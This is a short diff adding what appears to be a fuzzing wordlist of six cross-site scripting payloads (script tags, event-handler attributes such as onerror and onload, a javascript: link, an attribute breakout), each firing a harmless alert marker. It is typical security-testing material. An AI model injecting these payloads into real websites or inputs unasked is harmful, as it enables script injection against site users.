@@ -1,0 +1,6 @@
+<script>alert('whsfuzzer')</script>
+<svg/onload=alert('whsfuzzer')>
+<img src='x' onerror='alert("whsfuzzer")'>
+<a href='javascript:alert("whsfuzzer")'>Click me</a>
+<input type="hidden" oncontentvisibilityautostatechange="alert(whsfuzzer)" style="content-visibility:auto">
+<input type="hidden" name="whsfuzzer" value=""><img src="z" onerror="alert(45)">
